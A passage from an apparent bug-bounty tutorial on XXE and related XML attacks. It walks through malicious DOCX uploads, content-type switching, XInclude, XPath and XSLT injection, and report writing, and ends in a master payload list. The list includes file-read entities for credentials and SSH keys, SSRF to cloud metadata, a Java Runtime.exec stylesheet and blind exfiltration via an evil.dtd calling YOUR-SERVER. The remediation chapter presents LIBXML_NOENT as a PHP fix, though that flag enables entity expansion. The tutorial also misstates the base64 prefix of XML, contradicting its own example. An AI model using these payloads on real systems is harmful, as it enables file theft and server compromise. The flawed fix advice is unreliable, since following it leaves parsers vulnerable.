<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:wpc="..." xmlns:w="...">
  <!-- ... existing content ... -->
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>
```

**Rezip:**
```bash
cd docx_unpacked
zip -r ../malicious.docx *
```

**Upload `malicious.docx` to the target.**

Scenarios where this works:
- "Upload your resume" (resume parsing, content extraction)
- Document conversion services ("convert DOCX to PDF")
- File indexing/search features (reads DOCX content for indexing)
- Antivirus/malware scanning (parses the file to inspect it)
- Cloud storage with preview features

## 7.3 Content-Type Header Switching

Many API endpoints accept JSON by default but will also parse XML if you send it. The endpoint doesn't change — just the `Content-Type` header and the request body format.

**Original request:**
```http
POST /api/stock-check HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/json
Content-Length: 30

{"productId": "123", "qty": 1}
```

**Modified request:**
```http
POST /api/stock-check HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/xml
Content-Length: 130

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId><qty>1</qty></stockCheck>
```

If the application:
- Returns an error about "invalid product ID" and shows the content → classic XXE
- Processes the request normally but doesn't show the XML → test for blind XXE
- Returns a JSON parse error → it only accepts JSON, move on

This works because many backend frameworks auto-negotiate content type. If they have an XML parser library available, they'll use it.

## 7.4 XInclude Attacks

**The scenario:** You're submitting input to a form field, and the application embeds your input into a larger XML document on the server side before parsing it. You control only part of the document, not the DTD.

You can't add a `<!DOCTYPE>` block because you're not in control of the document structure. But you can inject an **XInclude** directive.

**XInclude** is a W3C standard for including XML sub-documents. It's a different mechanism from DTD external entities, but achieves a similar result.

**Inject this as the value of the form field:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

If the application embeds your input into XML without sanitizing it, and the XML parser supports XInclude, it will try to include the specified file.

- `xmlns:xi="http://www.w3.org/2001/XInclude"` — declares the XInclude namespace
- `xi:include` — the include directive
- `parse="text"` — include the file as plain text, not as XML (otherwise it would try to parse the file as XML, which would fail for non-XML files)
- `href="file:///etc/passwd"` — the resource to include

**Where to try XInclude:**
- Search boxes
- Product ID fields
- Username fields in XML-based APIs
- Any parameter that gets embedded in XML (especially SOAP parameters)

## 7.5 SOAP Web Services

SOAP is XML. Every SOAP request has an envelope structure:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <!-- authentication here -->
  </soap:Header>
  <soap:Body>
    <m:GetUserInfo xmlns:m="http://example.com/service">
      <m:UserId>12345</m:UserId>
    </m:GetUserInfo>
  </soap:Body>
</soap:Envelope>
```

To test for XXE in SOAP, add your DTD after the `<?xml ?>` declaration:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <m:GetUserInfo xmlns:m="http://example.com/service">
      <m:UserId>&xxe;</m:UserId>
    </m:GetUserInfo>
  </soap:Body>
</soap:Envelope>
```

SOAP services are common in:
- Banking/financial applications
- Healthcare systems
- Enterprise resource planning (ERP) software
- Legacy integrations and B2B APIs
- Government systems

These are high-value targets because they're old, maintain sensitive data, and are often poorly tested.

## 7.6 Base64-Encoded XML

Some applications base64-encode their XML data before passing it in HTTP parameters. You might see something like:

```
POST /process HTTP/1.1

data=PD94bWwgdmVyc2lvbj0iMS4wIj8+...
```

Decode it:
```bash
echo "PD94bWwgdmVyc2lvbj0iMS4wIj8+" | base64 -d
# <?xml version="1.0"?>...
```

If it's XML, craft your malicious payload, base64-encode it, and send it back. Base64-encoded XML typically starts with `LD94bWw` which decodes to `<?xml`.

---

# CHAPTER 8 — The Full XML Attack Family

## 8.1 XML Injection

**What it is:** If user input is embedded into XML without sanitization, you can inject XML tags and modify the document's structure. Similar to SQL injection but targeting XML data.

**Vulnerable code pattern:**
```python
xml = "<user><name>" + user_input + "</name><role>user</role></user>"
```

**Attack input:**
```
John</name><role>admin</role><extra>
```

**Resulting XML:**
```xml
<user>
  <name>John</name>
  <role>admin</role>
  <extra></name><role>user</role>
  </user>
```

The `role` tag now appears twice. Depending on how the application processes this (which one does it use — first occurrence or last?), you may have escalated to admin.

**Testing for XML injection:**
Try submitting `<`, `>`, `"`, `'`, `&` in input fields. If:
- The app errors out: it's using XML and not sanitizing
- The characters are reflected in a response as unencoded tags: XML injection may be possible

**Impact:** Authentication bypass, privilege escalation, data manipulation.

## 8.2 XPath Injection

**What it is:** XPath is the query language for navigating XML documents — like SQL for relational databases. If user input is embedded in an XPath query without sanitization, you can manipulate the query logic.

**Vulnerable query pattern:**
```python
xpath = f"/users/user[name='{username}' and password='{password}']"
result = xml_doc.xpath(xpath)
if result:
    # logged in
```

**Attack — bypass authentication:**
Input for `username`:
```
admin' or '1'='1
```

Resulting XPath:
```xpath
/users/user[name='admin' or '1'='1' and password='anything']
```

Since `'1'='1'` is always true, this returns all users. If the code checks `if result:`, you're logged in as admin.

**More XPath attacks:**
```
' or 1=1 or '1'='0
x' or name()='username' or 'x'='y
```

**Blind XPath injection** (when no output is returned):
Use boolean conditions to extract data character by character:
```
' and substring(//user[1]/password,1,1)='a
' and substring(//user[1]/password,1,1)='b
```

When the response is different (login succeeds vs fails), you know whether that character matches.

**Where to test:**
- Login forms (if the backend uses XML-based user storage)
- Search functions in XML-based applications
- LDAP-backed applications (LDAP uses a similar query language)

## 8.3 XSLT Injection

**What it is:** XSLT (XSL Transformations) is a programming language for transforming XML. It's Turing-complete — it can do real computation, access the filesystem, make network requests, and in some processors, execute code.

**Why it's dangerous:** If user input is embedded in an XSLT template that gets executed, you can inject XSLT instructions.

**Extreme case — RCE via Xalan-J processor:**
```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
  exclude-result-prefixes="rt ob">
  <xsl:template match="/">
    <xsl:variable name="runtime" select="rt:getRuntime()"/>
    <xsl:variable name="cmd" select="rt:exec($runtime, 'id')"/>
    <xsl:variable name="result" select="ob:toString($cmd)"/>
    <xsl:value-of select="$result"/>
  </xsl:template>
</xsl:stylesheet>
```

This calls Java's `Runtime.exec()` to run the `id` command on the server.

**Where to test:**
- Template engines that accept user-supplied XSLT
- XML document transformation services
- Report generation with user-customizable XSLT

## 8.4 XXE via DTD Retrieval

Some XML parsers automatically fetch external DTDs referenced in the `DOCTYPE` declaration:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>...</html>
```

Some parsers actually fetch `http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd`. This is itself an SSRF — you can change the DTD URL to an internal address and use it for port scanning or accessing internal resources, even without external entity support.

## 8.5 Decompression Bomb

If the XML parser accepts compressed input (gzipped HTTP bodies, compressed XML files), you can send a small compressed file that expands to a huge size when decompressed:

```bash
dd if=/dev/zero bs=1M count=1024 | gzip > zeros.gz
# 1GB of zeros compressed to ~1MB
```

The compressed file passes size checks. When decompressed and parsed, the parser processes 1GB of data. Combined with entity expansion, the effect multiplies.

---

# CHAPTER 9 — Hunting Like a Researcher

## 9.1 The Researcher Mindset vs. The VAPT Mindset

**VAPT/checklist mindset:** "Run tool X, check box Y, write report."

**Researcher mindset:** "Why does this endpoint accept XML? What does the server do with it? If the parser processes it, where does the result go? Can I observe its behavior indirectly?"

The difference matters because:
- Most automated scanners miss blind XXE
- Automated scanners miss XXE in file uploads completely
- Automated scanners miss XInclude attacks
- Automated scanners miss XXE via content-type switching

The researcher finds these by *thinking*, not by running Burp's scanner and reporting what it flags.

## 9.2 Reconnaissance — Mapping the Attack Surface

Before sending any payload, map where XML might exist in the application.

**Using Burp Suite:**
1. Set Burp as your proxy
2. Browse the entire application — log in, use every feature, upload files, use search, check out, etc.
3. In Burp's HTTP history, look for:
   - Requests with `Content-Type: text/xml` or `application/xml`
   - Request bodies containing `<?xml` or `<!DOCTYPE`
   - Tree-like tag structures in request/response bodies
   - Base64 blobs in parameters (decode them — check if they're XML)
   - SOAP endpoints (URLs like `/ws`, `/wsdl`, `/soap`, `/service`)

**Look at the response, not just the request:**
- Does the response contain XML?
- Does the response contain data that might have come from an XML document?
- Does the response show server errors that mention XML parsing?

**File uploads — look at what formats are accepted:**
Note every file upload point and what formats it accepts. SVG, DOCX, XLSX, PPTX, ODT, XML — all are XML-based. Even if they're not listed, try uploading them.

**Check for hidden XML acceptance:**
For every non-XML endpoint, try changing `Content-Type` to `application/xml`. A server error about XML parsing confirms the endpoint processes XML. An unrelated error or normal response means it doesn't.

## 9.3 Testing Strategy — Step by Step

### Phase 1: Confirm XML Parsing

**Test 1: Do entities work?**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY t "XXETEST123">]>
<data>&t;</data>
```
If the response contains `XXETEST123`, internal entities work. Move to external entities.

**Test 2: Do external entities work (classic)?**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY t SYSTEM "file:///etc/hostname">]>
<data>&t;</data>
```
`/etc/hostname` is harmless and unique. If it appears in the response → classic XXE confirmed.

**Test 3: Try PUBLIC if SYSTEM fails:**
```xml
<!ENTITY t PUBLIC "any-string" "file:///etc/hostname">
```

### Phase 2: Determine Classic vs. Blind

If the file content appears in the response: **classic XXE**. Escalate immediately to sensitive files.

If you get no useful output but the request was processed:
**Test 4: Test for blind XXE with callback:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY t SYSTEM "http://YOUR-BURP-COLLABORATOR/">]>
<data>&t;</data>
```
Check Collaborator for DNS/HTTP interaction. If you see it: blind XXE confirmed.

**Test 5: Try parameter entity callback (if general entities are blocked):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % t SYSTEM "http://YOUR-BURP-COLLABORATOR/">
  %t;
]>
<data>test</data>
```

### Phase 3: Classic XXE Escalation

If classic XXE confirmed, work through the file list in this order:
1. `/etc/hostname` (already confirmed, harmless)
2. `/etc/passwd` (users — medium sensitivity)
3. `~/.bash_history` (commands — often high value)
4. `/proc/self/environ` (environment — often has API keys)
5. `/etc/shadow` (hashed passwords — requires parser running as root)
6. App config files (database passwords, API keys)
7. SSH keys
8. Source code

**Pro tip:** After reading `/etc/passwd`, you know the home directories. Then you can read bash history for each user:
```
/root/.bash_history
/home/www-data/.bash_history
/home/arjun/.bash_history
```

### Phase 4: Blind XXE Escalation

If blind XXE confirmed:
1. Set up your external DTD server
2. Start with `/etc/hostname` to confirm exfiltration works
3. Escalate to `/etc/passwd`, bash history, etc.
4. If outbound HTTP is blocked, try error-based exfil
5. If both are blocked, try the local DTD repurposing technique

### Phase 5: Test All Non-Obvious Surfaces

Even after finding a classic XXE on one endpoint, keep testing:
- SVG upload points
- Office document upload points
- Every endpoint with content-type switching
- XInclude in every form field that might embed to XML

### Phase 6: SSRF Testing

If external entities work, test SSRF:
1. Make the server connect to your collaborator via HTTP (confirm SSRF capability)
2. Try cloud metadata endpoints (169.254.169.254)
3. Try internal addresses (10.x.x.x, 192.168.x.x, 172.16.x.x)
4. Port scan 127.0.0.1 common ports
5. Try reaching internal admin panels

## 9.4 Tools You'll Actually Use

**Burp Suite (essential):**
- Intercept and modify XML requests
- Collaborator for blind XXE detection
- Active Scanner to find obvious XXEs automatically
- Repeater for manual payload testing

**XXEinjector:**
Automated XXE exploitation tool. Good for confirming bugs and basic file extraction.
```bash
ruby XXEinjector.rb --host=YOUR-SERVER --httpport=80 --file=request.txt --path=/etc/passwd --oob=http
```

**interactsh (free Collaborator alternative):**
```bash
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Run
interactsh-client
# Get your unique URL and use it in payloads
```

**xmllint (validate your payload syntax):**
```bash
xmllint --noout your_payload.xml
# If no output: valid XML syntax
# If errors: fix them before testing
```

---

# CHAPTER 10 — Writing Real Bug Reports

## 10.1 What Makes a Good XXE Report

A good bug report answers these questions clearly:
1. What is the vulnerability? (one clear sentence)
2. Where exactly is it? (endpoint, parameter, exact location)
3. How do you reproduce it? (exact steps, exact payloads)
4. What is the impact? (what can be done with it)
5. What is the proof? (screenshots, server response showing the data)

## 10.2 Template for an XXE Report

```markdown
## Summary
A XML External Entity (XXE) injection vulnerability exists at the [endpoint name]
endpoint, allowing an unauthenticated/authenticated attacker to read arbitrary 
files from the server filesystem.

## Vulnerability Details
- **Type:** XML External Entity (XXE) Injection
- **Endpoint:** POST /api/import-data
- **Parameter:** XML body
- **Authentication:** Required (normal user account)
- **CVSS Score:** 7.5 (High) — or calculate accurately

## Steps to Reproduce

1. Log in to the application with a normal user account.
2. Navigate to [feature name] > [Import Data].
3. Intercept the import request using Burp Suite.
4. Replace the request body with the following payload:

[payload here]

5. Forward the request.
6. Observe the server response contains the contents of /etc/passwd.

## Proof of Concept

**Request:**
```
POST /api/import-data HTTP/1.1
Host: vulnerable-app.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<import><data>&xxe;</data></import>
```

**Response:**
```
HTTP/1.1 200 OK
Content-Type: application/json

{"status":"processed","content":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1..."}
```

[Include screenshot here]

## Impact

An attacker can read arbitrary files from the server, potentially accessing:
- Application source code and configuration files containing database credentials
- SSH private keys
- User credential files (/etc/shadow if server runs as root)
- Environment variables containing API keys and secrets

This can lead to full server compromise or complete data breach depending on
what sensitive files are accessible.

## Remediation

1. Disable external entity processing in the XML parser:
   [language-specific fix]
2. Disable DTD processing entirely if not required.
3. Use a safe XML parsing library (e.g., defusedxml for Python).
```

## 10.3 Real Disclosed Reports to Study

**HackerOne #106797 — Informatica Marketplace XXE:**
- Found on a search API endpoint (`/api/rest/mpapi/infaMPAPISearchWebService/query`)
- The endpoint accepted XML in the request body
- Researcher replaced the body with a classic XXE payload pointing to `file:///etc/passwd`
- The response contained the file contents
- Classic XXE, clear endpoint, high impact

**HackerOne #312543:**
- Demonstrates that XXE can live in places developers don't expect
- Study this to understand how researchers think about attack surface

**Key lessons from real reports:**
- The bug is often in an endpoint that clearly processes user-supplied XML
- Researchers test *every* XML-accepting endpoint systematically
- The key differentiator is testing both classic and blind variants
- High-quality reports include the exact HTTP request, exact response, and a clear impact statement

---

# CHAPTER 11 — Prevention (How Defenders Fix It)

*Understanding defense deeply makes you a better attacker. When you know how it's fixed, you understand what bypass techniques are needed when it's improperly fixed.*

## 11.1 The Correct Fixes (Language-Specific)

### Java
```java
// VULNERABLE (default):
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();

// SECURE:
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
DocumentBuilder builder = factory.newDocumentBuilder();
```

### PHP
```php
// VULNERABLE:
$dom = new DOMDocument();
$dom->loadXML($userXml);

// SECURE (PHP >= 8.0):
libxml_disable_entity_loader(true);
$dom = new DOMDocument();
$dom->loadXML($userXml, LIBXML_NONET);

// Even better — use libxml options:
$dom->loadXML($userXml, LIBXML_NOENT | LIBXML_NONET | LIBXML_NOCDATA);
```

### Python
```python
# VULNERABLE:
from xml.etree import ElementTree
tree = ElementTree.parse(user_file)

# SECURE — use defusedxml library:
import defusedxml.ElementTree as ET
tree = ET.parse(user_file)  # defusedxml disables all dangerous features
```

### .NET (C#)
```csharp
// VULNERABLE (old code):
XmlDocument doc = new XmlDocument();
doc.LoadXml(userXml);

// SECURE:
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;  // Disable external resource resolution
doc.LoadXml(userXml);

// Or use XmlReaderSettings:
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(inputStream, settings);
```

## 11.2 Partially-Fixed Vulnerabilities — What to Look For

Sometimes developers fix XXE *partially*. This is actually common, and knowing what partial fixes look like helps you find bypasses.

**Common incomplete fixes:**

"Only disabled general external entities but not parameter entities" → Blind XXE via parameter entities still works.

"Disabled DTD processing for the main parser but the application uses two different parsers" → The second parser may still be vulnerable.

"Using allowlisting on entity values but not on entity URLs" → May still be bypassed with URL encoding or alternative protocols.

"Using a blacklist to block `SYSTEM` keyword" → Try `PUBLIC`, try `SYSTEM` with different casing, try base64 or URL encoding.

**Test each parser separately** in an application — the SAML parser, the file import parser, and the search parser might all have different configurations.

## 11.3 The Full Defense Checklist (Understand Each)

- **Disable external entity resolution** — the core fix
- **Disable DTD processing** — prevents the attack entirely
- **Disable XInclude** — separate attack vector
- **Limit parse depth** — mitigates Billion Laughs
- **Limit total parse time** — mitigates slow DoS attacks
- **Block outbound network access from the parser process** — limits blind XXE impact
- **Use a safe parser library** (defusedxml, etc.) — applies all safe defaults
- **Input validation / allowlisting** — don't let user control DTD content
- **Use JSON instead of XML where possible** — avoids the attack class entirely
- **Keep parser libraries updated** — patch known vulnerabilities
- **Regular code auditing** including dependencies — find it before attackers do

---

# CHAPTER 12 — Master Payload Reference

*These are all the payloads I've learned. Organized by use case.*

## 12.1 Classic File Read

```xml
<!-- Basic SYSTEM -->
<?xml version="1.0"?><!DOCTYPE r[<!ENTITY f SYSTEM "file:///etc/passwd">]><r>&f;</r>

<!-- PUBLIC variant (try if SYSTEM is blocked) -->
<?xml version="1.0"?><!DOCTYPE r[<!ENTITY f PUBLIC "x" "file:///etc/passwd">]><r>&f;</r>

<!-- Windows target -->
<?xml version="1.0"?><!DOCTYPE r[<!ENTITY f SYSTEM "file:///c:/windows/win.ini">]><r>&f;</r>
```

## 12.2 SSRF Payloads

```xml
<!-- Basic SSRF -->
<?xml version="1.0"?><!DOCTYPE r[<!ENTITY s SYSTEM "http://INTERNAL-IP/path">]><r>&s;</r>

<!-- AWS metadata -->
<?xml version="1.0"?><!DOCTYPE r[<!ENTITY s SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]><r>&s;</r>

<!-- Internal port scan (change port to probe) -->
<?xml version="1.0"?><!DOCTYPE r[<!ENTITY s SYSTEM "http://127.0.0.1:8080/">]><r>&s;</r>
```

## 12.3 Blind XXE — OOB Detection

```xml
<!-- HTTP callback -->
<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "http://YOUR-SERVER/">]><r>&x;</r>

<!-- DNS only callback -->
<?xml version="1.0"?><!DOCTYPE r[<!ENTITY x SYSTEM "http://probe.YOUR-SERVER/">]><r>&x;</r>

<!-- Parameter entity callback (if general entities are blocked) -->
<?xml version="1.0"?><!DOCTYPE r[<!ENTITY % x SYSTEM "http://YOUR-SERVER/">%x;]><r/>
```

## 12.4 Blind XXE — External DTD Exfiltration

**Payload to send to target:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER/evil.dtd">
  %dtd;
]>
<foo>test</foo>
```

**evil.dtd hosted on your server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SERVER/?x=%file;'>">
%wrap;
%exfil;
```

## 12.5 Error-Based Blind XXE

**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%wrap;
%err;
```

## 12.6 CDATA Exfiltration (for Files with XML Special Characters)

**evil.dtd:**
```xml
<!ENTITY % file SYSTEM "file:///target/config.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrap "<!ENTITY &#x25; exfil 'http://YOUR-SERVER/?x=%start;%file;%end;'>">
%wrap;
%exfil;
```

## 12.7 PHP Filter (PHP Applications Only)

```xml
<!-- Base64-encode any file -->
<?xml version="1.0"?>
<!DOCTYPE r[
  <!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]><r>&f;</r>

<!-- Read PHP source code without execution -->
<?xml version="1.0"?>
<!DOCTYPE r[
  <!ENTITY f SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]><r>&f;</r>
```

## 12.8 XInclude (When You Control Only Part of the Document)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## 12.9 SVG with XXE

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY f SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text font-size="10" x="0" y="20">&f;</text>
</svg>
```

## 12.10 Important Files to Target (Quick Reference)

| File | What It Contains | Notes |
|------|-----------------|-------|
| `/etc/passwd` | Usernames, UIDs, home dirs, shells | Always readable |
| `/etc/shadow` | Hashed passwords | Often root-only |
| `/etc/hostname` | Server hostname | Use to confirm XXE |
| `/etc/hosts` | Internal IP/hostname mappings | Network recon |
| `/etc/resolv.conf` | DNS servers | Network recon |
| `~/.bash_history` | Command history | Often has passwords |
| `~/.ssh/id_rsa` | SSH private key | Direct server access |
| `/proc/self/environ` | Environment variables | API keys, secrets |
| `/proc/self/cmdline` | Running process command | What's running |
| `/var/www/html/config.php` | DB/API config | Adjust path per app |
| `/app/config/database.yml` | Rails DB config | Ruby apps |
| `C:/windows/win.ini` | Windows config | Windows servers |
| `C:/inetpub/wwwroot/web.config` | IIS config | .NET apps |

---

# FINAL NOTES — Mental Models to Remember

**The core insight:**
XML parsers trust their input. DTDs let documents define external resources. When users supply the XML, they supply the DTD. The parser does whatever the DTD says. If it says "read this file" — it reads that file.

**The three questions when you see XML:**
1. Does this XML get parsed server-side?
2. Does the parser have external entity resolution enabled?
3. Can I see the result, or do I need out-of-band exfiltration?

**The hidden surface insight:**
"Does this app accept XML?" is the wrong question. The right question is: "Does this app parse XML — directly or through libraries, file formats, or protocol handling?" The answer is almost always yes if the app has any of: file upload, SAML SSO, SOAP/API, document processing, or older codebase.

**The blindness insight:**
Blind XXE is more common than classic XXE in real applications. Most apps process XML without returning the raw parsed content. But blind doesn't mean invisible — it means you need to make the server come to you.

**The bypass insight:**
When a fix is in place, think about:
- Are ALL parsers in the application hardened, or just the main one?
- Is the fix for general entities but not parameter entities?
- Can I use XInclude instead, since it's a different mechanism?
- Can I use a file upload vector that goes through a different parser?

---
